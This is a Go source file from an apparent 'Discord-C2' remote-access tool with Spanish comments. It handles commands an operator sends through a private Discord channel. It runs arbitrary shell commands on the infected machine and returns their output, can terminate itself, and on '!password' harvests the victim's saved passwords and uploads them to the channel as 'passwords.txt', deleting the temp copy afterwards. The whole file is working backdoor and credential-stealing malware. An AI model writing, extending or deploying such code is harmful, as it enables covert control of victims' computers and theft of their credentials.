package interactions

import (
	"Discord-C2/config"
	"Discord-C2/utils"
	"os"
	"path/filepath"
	"strings"

	"github.com/bwmarrin/discordgo"
)

func HandleCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Solo responde en el canal privado
	if m.ChannelID != config.PrivateChan || m.Author.ID == s.State.User.ID {
		return
	}

	// Añadir reacción de reloj 🕐 silenciosamente
	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
	actionCode := 0

	// Comando para ejecutar otros comandos
	if strings.HasPrefix(m.Content, "!run") {
		command := strings.TrimSpace(strings.TrimPrefix(m.Content, "!run"))

		if command == "" {
			s.ChannelMessageSendReply(m.ChannelID, "❌ Error: Empty command", m.Reference())
			s.MessageReactionAdd(m.ChannelID, m.ID, "❌")
			return
		}

		output, err := ExecuteCommand(command)
		if err != nil {
			output = "Error durante la ejecución del comando."
		}

		// Manejar salida vacía
		if strings.TrimSpace(output) == "" {
			output = "Command executed successfully with no output."
		}

		// Manejar salida grande
		if len(output) > 1987 {
			chunks := splitLargeOutput(output, 1987)
			for i, chunk := range chunks {
				msgBuilder := strings.Builder{}
				msgBuilder.WriteString("```\n")
				if len(chunks) > 1 {
					msgBuilder.WriteString("[Part " + string(rune(i+1)) + "/" + string(rune(len(chunks))) + "]\n")
				}
				msgBuilder.WriteString(chunk + "\n")
				msgBuilder.WriteString("```")
				s.ChannelMessageSendReply(m.ChannelID, msgBuilder.String(), m.Reference())
			}
		} else {
			msgBuilder := strings.Builder{}
			msgBuilder.WriteString("```\n")
			msgBuilder.WriteString(output + "\n")
			msgBuilder.WriteString("```")
			s.ChannelMessageSendReply(m.ChannelID, msgBuilder.String(), m.Reference())
		}

		actionCode = 1
	} else if m.Content == "!kill" {
		actionCode = 2
		go func() {
			os.Exit(0)
		}()
	} else if strings.TrimSpace(m.Content) == "!password" {
		// Catch panics that might occur during password grabbing
		defer func() {
			if recover() != nil {
				s.ChannelMessageSend(m.ChannelID, "❌ Error al recuperar contraseñas.")
				actionCode = 2
			}
		}()

		// Ejecutar la función GrabPasswords
		passwords := utils.GrabPasswords()

		// Si no se encuentran contraseñas, responder con un error
		if passwords == "No passwords found." {
			s.ChannelMessageSend(m.ChannelID, "❌ No se encontraron contraseñas.")
			actionCode = 2
		} else {
			// Obtener directorio temporal del sistema
			tempDir := os.TempDir()
			// Crear un nombre de archivo aleatorio para las contraseñas
			fileName := filepath.Join(tempDir, "pwdata.tmp")

			// Guarda las contraseñas en el archivo temporal
			err := os.WriteFile(fileName, []byte(passwords), 0600) // Guarda con permisos seguros
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, "❌ Error al guardar contraseñas.")
				actionCode = 2
			} else {
				// Envía el archivo con las contraseñas
				file, err := os.Open(fileName)
				if err != nil {
					s.ChannelMessageSend(m.ChannelID, "❌ Error al abrir archivo.")
					actionCode = 2
				} else {
					defer file.Close()
					// Enviamos con el nombre "passwords.txt" para que se vea normal al descargarlo
					s.ChannelFileSend(m.ChannelID, "passwords.txt", file)
					// Elimina el archivo después de enviarlo
					file.Close() // Cerramos explícitamente antes de eliminar
					os.Remove(fileName)
					actionCode = 3
				}
			}
		}
	}

	// Elimina la reacción de reloj 🕐 al finalizar
	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")

	// Añade la reacción de éxito ✅
	if actionCode > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
	}
}

// splitLargeOutput divide la salida en partes más pequeñas.
func splitLargeOutput(output string, chunkSize int) []string {
	var chunks []string
	if len(output) == 0 {
		return chunks
	}

	for len(output) > 0 {
		if len(output) < chunkSize {
			chunks = append(chunks, output)
			break
		}
		chunks = append(chunks, output[:chunkSize])
		output = output[chunkSize:]
	}
	return chunks
}
